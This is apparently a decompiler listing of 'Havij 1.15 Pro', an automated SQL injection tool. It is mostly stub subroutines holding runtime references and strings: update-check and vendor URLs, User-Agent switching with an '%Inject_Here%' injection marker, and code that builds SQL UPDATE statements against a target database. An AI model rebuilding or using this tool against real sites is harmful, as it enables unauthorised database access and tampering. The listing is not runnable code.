'N  * ref: __vbaVar2Vec
'N  * ref: __vbaAryMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: DoEvents
'N  * ref: __vbaOnError
'N  * ref: StrConv(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVar2Vec
'N  * ref: __vbaAryMove
'N  * ref: __vbaFreeObj
'N  * ref: DoEvents
'N  * ref: __vbaLenBstr
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaAryDestruct
'N  * ref: __vbaFreeStr
End Sub
 
Sub Label13_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaStrToAnsi
'N  * ref: "http://itsecteam.com"
'N  * ref: "Open"
'N  * API ref: ShellExecuteA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
End Sub
 
Sub Label21_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: _adj_fdiv_m32
'N  * ref: _adj_fdiv_m32
'N  * ref: _adj_fdiv_m32
'N  * ref: _adj_fdiv_m32
'N  * ref: _adj_fdiv_m32
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFPException
End Sub
 
Sub Label28_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaStrToAnsi
'N  * ref: "mailto:info@itsecteam.com"
'N  * ref: "Open"
'N  * API ref: ShellExecuteA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
End Sub
 
Sub Label29_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaStrToAnsi
'N  * ref: "http://forum.itsecteam.com"
'N  * ref: "Open"
'N  * API ref: ShellExecuteA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
End Sub
 
Sub Label30_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
End Sub
 
Sub Label31_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
End Sub
 
Sub Label44_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub Label44_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObjList
End Sub
 
Sub Label5_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "Please first stop the current job."
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: "Checking for update..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "http://itsecteam.com/files/havij/updatecheck.php?myver="
'N  * ref: "Havij 1.15 Pro"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: Subr_151
'N  * ref: __vbaFreeStr
'N  * ref: "|"
'N  * ref: __vbaInStr
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "|"
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Havij "
'N  * ref: "."
'N  * ref: " is available since "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "A newer version of Havij is available do you want to download?"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrToAnsi
'N  * ref: __vbaStrToAnsi
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaStrToAnsi
'N  * ref: "Open"
'N  * ref: __vbaStrToAnsi
'N  * API ref: ShellExecuteA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVar
'N  * ref: "You are using the last version of Havij"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "You are up to date!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: MsgBox
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaUI1I2
'N  * ref: __vbaUI1I2
'N  * ref: "Checking for update failed!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub Label9_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub Label9_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObjList
End Sub
 
Sub lblClearLog_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
End Sub
 
'Sub lstData_Event35()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarDup
'N  * ref: "|"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: "|"
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: Left(
'N  * ref: "."
'N  * ref: ".."
'N  * ref: "mssql"
'N  * ref: __vbaVarCmpEq
'N  * ref: IIf(
'N  * ref: IsNumeric(
'N  * ref: IsNumeric(
'N  * ref: "UPDATE "
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarCat
'N  * ref: IIf(
'N  * ref: " SET "
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: "="
'N  * ref: "'"
'N  * ref: IIf(
'N  * ref: "'"
'N  * ref: IIf(
'N  * ref: " where "
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: IsNumeric(
'N  * ref: IsNumeric(
'N  * ref: __vbaI4Var
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: "="
'N  * ref: " IS NULL"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "'"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: "'"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: " and "
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarMove
'N  * ref: LCase(
'N  * ref: "query failed"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub lstData_Event34()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub lstData_Event26()
'N  * ref: __vbaExceptHandler
'End Sub
 
'Sub lstData_Event16()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'End Sub
 
Sub lstDB_GotFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub lstDB_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaBoolVar
'N  * ref: __vbaBoolVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
'Sub lstFoundPages_Event16()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'End Sub
 
Sub mnifFox_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "User-Agent"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2"
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnuAddChNode_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: "Enter name of node:"
'N  * ref: __vbaVarDup
'N  * ref: InputBox(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "This item already exists!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub mnuAddnode_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: "Enter name of node:"
'N  * ref: __vbaVarDup
'N  * ref: InputBox(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: IsObject(
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "This item already exists!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub mnuchangenode_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Enter new name:"
'N  * ref: __vbaVarDup
'N  * ref: InputBox(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: "."
'N  * ref: InstrRev(
'N  * ref: Left(
'N  * ref: __vbaVarCat
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: "."
'N  * ref: InstrRev(
'N  * ref: Left(
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "This item already exists!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnuDelNode_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub mnuDeSelectChilds_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub mnuhavij_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "User-Agent"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Havij"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "User-Agent: Havij"
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnuIE_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "User-Agent"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)"
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnuInject_here_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "User-Agent"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaHresultCheckObj
'N  * ref: "%Inject_Here%"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "User-Agent: %Inject_Here%"
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
End Sub
 
Sub mnuopenurl_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrToAnsi
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "Open"
'N  * API ref: ShellExecuteA
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub mnuopera_Click()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "User-Agent"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Opera/9.23 (Windows NT 5.1; U; en-US)"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: "User-Agent: Opera/9.23 (Windows NT 5.1; U; en-US)"
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
